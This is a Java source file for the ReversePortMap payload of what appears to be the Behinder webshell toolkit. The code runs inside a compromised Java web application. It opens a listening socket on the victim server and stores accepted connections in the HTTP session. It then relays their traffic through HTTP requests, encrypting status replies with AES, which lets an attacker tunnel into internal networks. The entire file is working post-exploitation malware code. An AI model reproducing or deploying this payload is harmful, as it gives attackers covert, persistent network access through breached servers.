package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class ReversePortMap implements Runnable {
    public static String action;
    public static String extraData;
    public static String listenPort;
    public static String socketHash;
    private Object Request;
    private Object Response;
    private Object Session;
    private Map<String, Object> paramMap;
    private String threadType;

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            fillContext(obj);
            Map<String, Object> paramMap2 = new HashMap<>();
            paramMap2.put("request", this.Request);
            paramMap2.put("response", this.Response);
            paramMap2.put("session", this.Session);
            if (action.equals("create")) {
                String serverSocketHash = "reverseportmap_server_" + listenPort;
                paramMap2.put("serverSocketHash", serverSocketHash);
                paramMap2.put("listenPort", listenPort);
                ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
                serverSocketChannel.bind((SocketAddress) new InetSocketAddress(Integer.parseInt(listenPort)));
                sessionSetAttribute(this.Session, serverSocketHash, serverSocketChannel);
                serverSocketChannel.socket().setReuseAddress(true);
                new Thread(new ReversePortMap("daemon", paramMap2)).start();
                result.put("status", "success");
                result.put("msg", "success");
            } else if (action.equals("list")) {
                try {
                    List<Map<String, String>> socketList = new ArrayList<>();
                    Enumeration keys = sessionGetAttributeNames(this.Session);
                    while (keys.hasMoreElements()) {
                        String socketHash2 = keys.nextElement().toString();
                        if (socketHash2.indexOf("reverseportmap") >= 0) {
                            Map<String, String> socketObj = new HashMap<>();
                            socketObj.put("socketHash", socketHash2);
                            socketList.add(socketObj);
                        }
                    }
                    result.put("status", "success");
                    result.put("msg", buildJsonArray(socketList, false));
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                } catch (Exception e) {
                    result.put("status", "fail");
                    result.put("msg", e.getMessage());
                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                } catch (Throwable th) {
                    Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                    so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                    throw th;
                }
            } else if (action.equals("read")) {
                SocketChannel serverInnersocket = (SocketChannel) sessionGetAttribute(this.Session, socketHash);
                serverInnersocket.configureBlocking(false);
                try {
                    ByteBuffer buf = ByteBuffer.allocate(20480);
                    Object so4 = this.Response.getClass().getDeclaredMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so4.getClass().getDeclaredMethod("write", byte[].class, Integer.TYPE, Integer.TYPE);
                    for (int bytesRead = serverInnersocket.read(buf); bytesRead > 0; bytesRead = serverInnersocket.read(buf)) {
                        write.invoke(so4, buf.array(), 0, Integer.valueOf(bytesRead));
                        buf.clear();
                    }
                    so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                    so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
                } catch (Exception e2) {
                    this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
                    Object so5 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so5.getClass().getMethod("write", byte[].class).invoke(so5, new byte[]{55, 33, 73, 54});
                    so5.getClass().getMethod("flush", new Class[0]).invoke(so5, new Object[0]);
                    so5.getClass().getMethod("close", new Class[0]).invoke(so5, new Object[0]);
                } catch (Error error) {
                    error.printStackTrace();
                }
            } else if (action.equals("write")) {
                SocketChannel serverInnersocket2 = (SocketChannel) sessionGetAttribute(this.Session, socketHash);
                try {
                    byte[] extraDataByte = base64decode(extraData);
                    ByteBuffer buf2 = ByteBuffer.allocate(extraDataByte.length);
                    buf2.clear();
                    buf2.put(extraDataByte);
                    buf2.flip();
                    while (buf2.hasRemaining()) {
                        serverInnersocket2.write(buf2);
                    }
                } catch (Exception e3) {
                    Object so6 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write2 = so6.getClass().getMethod("write", byte[].class);
                    write2.invoke(so6, new byte[]{55, 33, 73, 54});
                    write2.invoke(so6, e3.getMessage().getBytes());
                    so6.getClass().getMethod("flush", new Class[0]).invoke(so6, new Object[0]);
                    so6.getClass().getMethod("close", new Class[0]).invoke(so6, new Object[0]);
                    serverInnersocket2.close();
                }
            } else if (action.equals("stop")) {
                Enumeration keys2 = sessionGetAttributeNames(this.Session);
                while (keys2.hasMoreElements()) {
                    String socketHash3 = keys2.nextElement().toString();
                    if (socketHash3.startsWith("reverseportmap_socket_" + listenPort)) {
                        try {
                            sessionRemoveAttribute(this.Session, socketHash3);
                            ((SocketChannel) sessionGetAttribute(this.Session, socketHash3)).close();
                        } catch (Exception e4) {
                        }
                    }
                }
                try {
                    String serverSocketHash2 = "reverseportmap_server_" + listenPort;
                    sessionRemoveAttribute(this.Session, serverSocketHash2);
                    ((ServerSocketChannel) sessionGetAttribute(this.Session, serverSocketHash2)).close();
                } catch (Exception e5) {
                    e5.printStackTrace();
                }
                result.put("status", "success");
                result.put("msg", "服务侧Socket资源已释放。");
            } else if (action.equals("close")) {
                try {
                    ((SocketChannel) sessionGetAttribute(this.Session, socketHash)).close();
                    sessionRemoveAttribute(this.Session, socketHash);
                } catch (Exception e6) {
                }
                result.put("status", "success");
                result.put("msg", "服务侧Socket资源已释放。");
            }
            try {
                if (action.equals("read")) {
                    return true;
                }
                Object so7 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so7.getClass().getMethod("write", byte[].class).invoke(so7, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so7.getClass().getMethod("flush", new Class[0]).invoke(so7, new Object[0]);
                so7.getClass().getMethod("close", new Class[0]).invoke(so7, new Object[0]);
                return true;
            } catch (Exception e7) {
                e7.printStackTrace();
                return true;
            }
        } catch (Exception e8) {
            e8.printStackTrace();
            result.put("status", "fail");
            result.put("msg", action + ":" + e8.getMessage());
            try {
                if (action.equals("read")) {
                    return true;
                }
                Object so8 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so8.getClass().getMethod("write", byte[].class).invoke(so8, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so8.getClass().getMethod("flush", new Class[0]).invoke(so8, new Object[0]);
                so8.getClass().getMethod("close", new Class[0]).invoke(so8, new Object[0]);
                return true;
            } catch (Exception e9) {
                e9.printStackTrace();
                return true;
            }
        } catch (Throwable th2) {
            try {
                if (!action.equals("read")) {
                    Object so9 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so9.getClass().getMethod("write", byte[].class).invoke(so9, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so9.getClass().getMethod("flush", new Class[0]).invoke(so9, new Object[0]);
                    so9.getClass().getMethod("close", new Class[0]).invoke(so9, new Object[0]);
                }
            } catch (Exception e10) {
                e10.printStackTrace();
            }
            throw th2;
        }
    }

    public ReversePortMap(String threadType2, Map<String, Object> paramMap2) {
        this.threadType = threadType2;
        this.paramMap = paramMap2;
    }

    public ReversePortMap() {
    }

    public void run() {
        if (this.threadType.equals("daemon")) {
            try {
                Object session = this.paramMap.get("session");
                ServerSocketChannel serverSocketChannel = (ServerSocketChannel) sessionGetAttribute(session, this.paramMap.get("serverSocketHash").toString());
                String listenPort2 = this.paramMap.get("listenPort").toString();
                while (true) {
                    try {
                        SocketChannel serverInnersocket = serverSocketChannel.accept();
                        Map<String, Object> paramMap2 = new HashMap<>();
                        paramMap2.put("session", session);
                        String serverInnersocketHash = "reverseportmap_socket_" + listenPort2 + "_" + serverInnersocket.socket().getInetAddress().getHostAddress() + "_" + serverInnersocket.socket().getPort();
                        paramMap2.put("serverInnersocketHash", serverInnersocketHash);
                        sessionSetAttribute(session, serverInnersocketHash, serverInnersocket);
                    } catch (Exception e) {
                        return;
                    }
                }
            } catch (Exception e2) {
            }
        }
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] base64decode(String base64Text) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        }
        getClass();
        Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
    }

    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        Iterator<Map<String, String>> it = list.iterator();
        while (it.hasNext()) {
            sb.append(buildJson(it.next(), encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private Object sessionGetAttribute(Object session, String key) {
        try {
            return session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }

    private Enumeration sessionGetAttributeNames(Object session) {
        try {
            return (Enumeration) session.getClass().getMethod("getAttributeNames", new Class[0]).invoke(session, new Object[0]);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionRemoveAttribute(Object session, String key) {
        try {
            session.getClass().getMethod("removeAttribute", new Class[0]).invoke(session, key);
        } catch (Exception e) {
        }
    }
}
